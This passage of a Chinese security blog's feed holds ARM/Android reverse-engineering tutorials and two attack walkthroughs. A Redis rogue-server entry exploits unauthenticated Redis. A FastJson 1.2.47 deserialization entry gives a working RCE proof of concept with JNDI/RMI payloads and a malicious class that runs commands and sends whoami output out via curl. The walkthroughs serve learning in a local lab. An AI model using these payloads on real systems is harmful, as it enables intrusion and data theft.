flagstr4print(flagstr)</code></pre><p>但是结果很怪，肯定是后面出了问题，但是理论上异或处理是错的，不该只出现在最后一位上，后面找了<a href="https://www.anquanke.com/post/id/168338#h3-20" target="_blank" rel="noopener">官方的WP</a>，看了别人的Java版poc，感觉也一样。莫非是一些编码和语言上处理的差别？暂时没处理掉此问题。</p><p><img src="\2019\08\2018-SWPUCTF\1566812912519.png" alt="1566812912519"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333&lt;/p&gt;
&lt;p&gt;于是，抽时间分析看看是否可以做出来。两个APK。&lt;/p&gt;
&lt;h3 id=&quot;app-debug1-apk&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>结构体链表逆向</title>
    <link href="/2019/07/%E7%BB%93%E6%9E%84%E4%BD%93%E9%93%BE%E8%A1%A8%E9%80%86%E5%90%91/"/>
    <id>/2019/07/结构体链表逆向/</id>
    <published>2019-07-26T09:23:50.000Z</published>
    <updated>2019-07-26T09:56:41.098Z</updated>
    
    <content type="html"><![CDATA[<h3 id="结构体链表逆向"><a href="#结构体链表逆向" class="headerlink" title="结构体链表逆向"></a>结构体链表逆向</h3><p>同样使用如下的C代码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct _student{    char name[32];    int age;    struct _student * next;}T_student;T_student * head = NULL;void Insert(const char *name,int age){    T_student * newnode;    newnode = (T_student *)malloc(sizeof(T_student));    newnode-&gt;age = age;    newnode-&gt;next = head;    strcpy(newnode-&gt;name,name);    head = newnode;}void PrintStudent(){    T_student * tmp;    tmp = head;    while(tmp)    {        printf(&quot;name:%s age:%d\n&quot;,tmp-&gt;name,tmp-&gt;age);        tmp=tmp-&gt;next;    }}int  main(){    Insert(&quot;Panda&quot;,15);    Insert(&quot;Dog&quot;,3);    Insert(&quot;Cat&quot;,2);    Insert(&quot;XiaoMing&quot;,20);    PrintStudent();}</code></pre><p>按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。</p><p><img src="\2019\07\结构体链表逆向\1564122124023.png" alt="1564122124023"></p><p>点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。</p><p><img src="\2019\07\结构体链表逆向\1564123321051.png" alt="1564123321051"></p><p>后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。</p><p>获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。</p><p><img src="\2019\07\结构体链表逆向\1564130434725.png" alt="1564130434725"></p><p>实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。</p><p><img src="\2019\07\结构体链表逆向\1564132058549.png" alt="1564132058549"></p><p>至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;结构体链表逆向&quot;&gt;&lt;a href=&quot;#结构体链表逆向&quot; class=&quot;headerlink&quot; title=&quot;结构体链表逆向&quot;&gt;&lt;/a&gt;结构体链表逆向&lt;/h3&gt;&lt;p&gt;同样使用如下的C代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM数组重定向</title>
    <link href="/2019/07/ARM%E6%95%B0%E7%BB%84%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>/2019/07/ARM数组重定向/</id>
    <published>2019-07-26T09:23:36.000Z</published>
    <updated>2019-07-26T09:56:13.330Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM数组重定向"><a href="#ARM数组重定向" class="headerlink" title="ARM数组重定向"></a>ARM数组重定向</h3><p>使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：</p><pre><code>#include &lt;stdio.h&gt;// Arraysint g_Table[100];int g_Table2[100];void PrintAddr(){    printf(&quot;g_Table:0x%x\ng_Table2:%x\n&quot;,g_Table,g_Table2);}void InitTable(){    int i;    for(i=0;i&lt;100;i++)        g_Table[i] = i;    printf(&quot;Table1 init ok\n&quot;);    for(i=0;i&lt;100;i++)        g_Table2[i] = i;}int search(int key){    int i=0;    for(;i&lt;100;i++)    {        if(g_Table[i]==key)            return i;    }    return -1;}int read(int x){    return g_Table[x];}void write(int x,int value){     g_Table[x] = value;}int main(){    int idx;    PrintAddr();    InitTable();    write(2,200);    write(6,900);    if((idx = search(200))!=-1)        write(idx,400);}</code></pre><p>利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫</p><p><img src="\2019\07\ARM数组重定向\1563864556080.png" alt="1563864556080"></p><p>选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。</p><p><img src="\2019\07\ARM数组重定向\1563865049285.png" alt="1563865049285"></p><p>而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。</p><pre><code>.text:00000400                 LDR     R2, =(g_Table_ptr - 0x1FE4).text:00000404                 LDR     R2, [R3,R2] ; g_Table</code></pre><p>回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始，</p><p><img src="\2019\07\ARM数组重定向\1563866904258.png" alt="1563866904258"></p><p>在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。</p><p>当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。</p><p>继续查看第二个循环体，由于跟第一个循环一致，不在细看。</p><p><img src="\2019\07\ARM数组重定向\1563868287872.png" alt="1563868287872"></p><p>分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。</p><p><img src="\2019\07\ARM数组重定向\1563868846505.png" alt="1563868846505"></p><p>函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。</p><p><img src="\2019\07\ARM数组重定向\1563870802372.png" alt="1563870802372"></p><p>在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下</p><pre><code>R1 = array[var_8] = array[i]R3 = var_10 = 200if array[var_8] == var_10:    return var_8</code></pre><p><img src="\2019\07\ARM数组重定向\1563874211104.png" alt="1563874211104"></p><p>最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。</p><p><img src="\2019\07\ARM数组重定向\1563875783761.png" alt="1563875783761"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM数组重定向&quot;&gt;&lt;a href=&quot;#ARM数组重定向&quot; class=&quot;headerlink&quot; title=&quot;ARM数组重定向&quot;&gt;&lt;/a&gt;ARM数组重定向&lt;/h3&gt;&lt;p&gt;使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：&lt;/p&gt;
&lt;pre&gt;&lt;code
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Redis 主从复制</title>
    <link href="/2019/07/Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>/2019/07/Redis-主从复制/</id>
    <published>2019-07-15T02:16:27.000Z</published>
    <updated>2019-07-15T02:37:01.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>redis主从复制，前几天分享的新版redis未授权利用的新型方式。</p><p>什么是主从复制，<a href="http://blog.itpub.net/31545684/viewspace-2213629/" target="_blank" rel="noopener">http://blog.itpub.net/31545684/viewspace-2213629/</a></p><p>通过redis命令来设置主从机</p><pre><code>127.0.0.1:6379&gt; slaveof 192.168.253.131 6379</code></pre><p>被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。</p><p>首先需要一个高版本的redis服务，<a href="https://redis.io/download。下载后按照官网给的安装步骤来安装。" target="_blank" rel="noopener">https://redis.io/download。下载后按照官网给的安装步骤来安装。</a></p><p>安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。</p><p><img src="\2019\07\Redis-主从复制\1563024704044.png" alt="1563024704044"></p><p>执行命令：<code>src/redis-server ./redis.conf</code>，开启redis成功。</p><p><img src="\2019\07\Redis-主从复制\1563023912222.png" alt="1563023912222"></p><p>下载脚本：<a href="https://github.com/Dliv3/redis-rogue-server。启动执行脚本" target="_blank" rel="noopener">https://github.com/Dliv3/redis-rogue-server。启动执行脚本</a></p><p>脚本执行完后显示：</p><p><img src="\2019\07\Redis-主从复制\1563025997123.png" alt="1563025997123"></p><p>同时可以看到redis日志中加载了so文件：</p><p><img src="\2019\07\Redis-主从复制\1563026034882.png" alt="1563026034882"></p><p>连接redis执行命令：</p><p><img src="\2019\07\Redis-主从复制\1563026095498.png" alt="1563026095498"></p><p>所以在未授权访问和弱密码登陆的情况下此问题才可以利用。</p><p>原文章：<a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Redis主从复制&quot;&gt;&lt;a href=&quot;#Redis主从复制&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制&quot;&gt;&lt;/a&gt;Redis主从复制&lt;/h3&gt;&lt;p&gt;redis主从复制，前几天分享的新版redis未授权利用的新型方式。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 反序列化</title>
    <link href="/2019/07/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>/2019/07/FastJson-反序列化/</id>
    <published>2019-07-15T02:16:07.000Z</published>
    <updated>2019-07-15T02:35:30.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="FastJson-反序列化"><a href="#FastJson-反序列化" class="headerlink" title="FastJson 反序列化"></a>FastJson 反序列化</h3><p>前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。</p><p>先下载1.2.47的FastJson，地址：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar" target="_blank" rel="noopener">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar</a></p><p>利用的JDK为，java_8u60。地址：<a href="https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe" target="_blank" rel="noopener">https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe</a></p><p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p><p>从File - Project Structure - Modules - Dependencies导入</p><p>创建poc为如下：</p><pre><code>import com.alibaba.fastjson.JSON;public class poc {    public static void main(String[] argv) {        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;        JSON.parse(payload);    }}</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p><p>创建一个RMI服务器。可以利用如下的JAVA代码。</p><pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class rmiServer {    public static void main(String[] args) throws Exception {        Registry registry = LocateRegistry.createRegistry(1099);        Reference reference = new Reference(&quot;Exloit&quot;,                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Exploit&quot;,referenceWrapper);    }}</code></pre><p>或者采用mar创建一个RMI服务器。</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p><pre><code>import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;public class Exploit implements ObjectFactory {    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {        exec(&quot;xterm&quot;);        return null;    }    public static String exec(String cmd) {        try {            Runtime.getRuntime().exec(&quot;calc&quot;);        } catch (IOException e) {            e.printStackTrace();        }        return &quot;&quot;;    }    public static void main(String[] args) {        exec(&quot;123&quot;);    }}</code></pre><p>此处利用mar创建的RMI服务器来验证：</p><p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p><p>查看HTTP服务，可以看到请求的恶意class请求。</p><p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p><p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p><p>当然如果也可以使用之前老RCE的恶意class文件</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class exploit2 {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public exploit2() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://localhost:8000/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>执行后，查看携带响应的请求</p><p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p><p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;FastJson-反序列化&quot;&gt;&lt;a href=&quot;#FastJson-反序列化&quot; class=&quot;headerlink&quot; title=&quot;FastJson 反序列化&quot;&gt;&lt;/a&gt;FastJson 反序列化&lt;/h3&gt;&lt;p&gt;前一段时间HW护出来一个FastJson的RCE。网
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向函数分析引用</title>
    <link href="/2019/07/%E9%80%86%E5%90%91%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E5%BC%95%E7%94%A8/"/>
    <id>/2019/07/逆向函数分析引用/</id>
    <published>2019-07-09T08:56:32.000Z</published>
    <updated>2019-07-26T09:56:38.114Z</updated>
    
    <content type="html"><![CDATA[<p>代码编译，使用代码如下:</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int fun1(){    int a;    int b;    b=10;    a=b++;    return a;}int fun2(int a,int b){    return a+b+fun1();}int fun3(int a,int b,int c,int d,int e,int f,int g,int h){    if(a+b+c &lt; d+e+f){        return a+b+c+fun2(a,f);    }else if(a+b+c &gt; d+e+f){        return a+b+c+fun2(b,e);    }else{        return 0;    }}int main(){    int tmp;    printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8));    return 0;}</code></pre><p>makefile文件同之前的基本一致</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下：</p><p><img src="\2019\07\逆向函数分析引用\1562658661016.png" alt="1562658661016"></p><p>其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义</p><pre><code>r0-r3    用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。r4-r11   被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。r12      是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。r13      是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。r14      是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复r15      是程序计数器 PC。它不能用于任何其它用途。</code></pre><p>详细介绍参考：<a href="https://www.veryarm.com/36274.html" target="_blank" rel="noopener">https://www.veryarm.com/36274.html</a></p><p>到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。</p><p><img src="\2019\07\逆向函数分析引用\1562659401125.png" alt="1562659401125"></p><p>判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。</p><p><img src="\2019\07\逆向函数分析引用\1562659598100.png" alt="1562659598100"></p><p>点击fun2，其中又调用了fun1函数，同样点击fun1。</p><p><img src="\2019\07\逆向函数分析引用\1562659844246.png" alt="1562659844246"></p><p>通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。</p><p><img src="\2019\07\逆向函数分析引用\1562659872641.png" alt="1562659872641"></p><p>而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。</p><p><img src="\2019\07\逆向函数分析引用\1562662004752.png" alt="1562662004752"></p><p>这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。</p><p><img src="\2019\07\逆向函数分析引用\1562662154590.png" alt="1562662154590"></p><p>此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代码编译，使用代码如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int fun1()
{
    int a;
    int b;
    b=10;
    a=b++;
  
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM原生循环语句逆向分析</title>
    <link href="/2019/07/ARM%E5%8E%9F%E7%94%9F%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>/2019/07/ARM原生循环语句逆向分析/</id>
    <published>2019-07-03T07:09:57.000Z</published>
    <updated>2019-07-26T09:56:09.610Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><p>使用的代码为非虫的Android软件安全权威指南，app6.c</p><p>代码如下：</p><pre><code>#include &lt;stdio.h&gt;int nums[5] = {1, 2, 3, 4, 5};int for1(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * 2;    }    return s;}int for2(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * i + nums[n - 1];    }    return s;}int dowhile(int n) {    int i = 1;    int s = 0;    do {        s += i;    } while (i++ &lt; n);    return s;}int whiledo(int n) {    int i = 1;    int s = 0;    while (i &lt;= n) {        s += i++;    }    return s;}void if1(int n) {    if (n &lt; 10) {        printf(&quot;the number less than 10\n&quot;);    } else {        printf(&quot;the number greater than or equal to 10\n&quot;);    }}void if2(int n) {    if (n &lt; 16) {        printf(&quot;he is a boy\n&quot;);    } else if (n &lt; 30) {        printf(&quot;he is a young man\n&quot;);    } else if (n &lt; 45) {        printf(&quot;he is a strong man\n&quot;);    } else {        printf(&quot;he is an old man\n&quot;);    }}int main(int argc, char *argv[]) {    printf(&quot;for1:%d\n&quot;, for1(5));    printf(&quot;for2:%d\n&quot;, for2(5));    printf(&quot;dowhile:%d\n&quot;, dowhile(100));    printf(&quot;while:%d\n&quot;, whiledo(100));    if1(5);    if2(35);    return 0;}</code></pre><p>删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下：</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561960721772.png" alt="1561960721772"></p><h4 id="1-for1函数"><a href="#1-for1函数" class="headerlink" title="1. for1函数"></a>1. for1函数</h4><p>查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561962684226.png" alt="1561962684226"></p><p>loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561964069808.png" alt="1561964069808"></p><p>按照以上逻辑写一段C代码，如下：</p><pre><code>int for1(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c = var_c + var_8 &lt;&lt; 1;    }    return var_c;}</code></pre><h4 id="2-for2函数"><a href="#2-for2函数" class="headerlink" title="2. for2函数"></a>2. for2函数</h4><p>for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562135688840.png" alt="1562135688840"></p><p>C代码：</p><pre><code>int nums[5] = {1,2,3,4,5};int for2(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c =var_c + var_8* var_8  + nums[var_10 - 1];    }    return var_c;}</code></pre><h4 id="3-dowhile函数"><a href="#3-dowhile函数" class="headerlink" title="3. dowhile函数"></a>3. dowhile函数</h4><p>其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561972796048.png" alt="1561972796048"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int dowhile(int var_10){    int var_8 = 1;    int var_c = 0;    do{        var_c = var_8 + var_c;        var_8 = var_8 + 1;    }while(var_8 &lt; var_10)    return var_c}</code></pre><h4 id="4-whiledo函数"><a href="#4-whiledo函数" class="headerlink" title="4. whiledo函数"></a>4. whiledo函数</h4><p>whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562122434389.png" alt="1562122434389"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int whiledo(int var_10){    int var_8 = 1;    int var_c = 0;    while(var_8 &lt;= var_10){        var_8 = var_8 + 1;        var_c = var_c + var_8;    }    return var_c}</code></pre><h4 id="5-if1-函数"><a href="#5-if1-函数" class="headerlink" title="5. if1 函数"></a>5. if1 函数</h4><p>如下，具有单分支的if结构体可以看出是if-else判断形式</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562123715096.png" alt="1562123715096"></p><p>按照汇编意思，C代码如下：</p><pre><code>void if1(int var_8){    if(var_8 &gt; 9){        puts(&quot;the number greater than or equal to 10&quot;);    }else{        puts(&quot;the number less than 10&quot;);    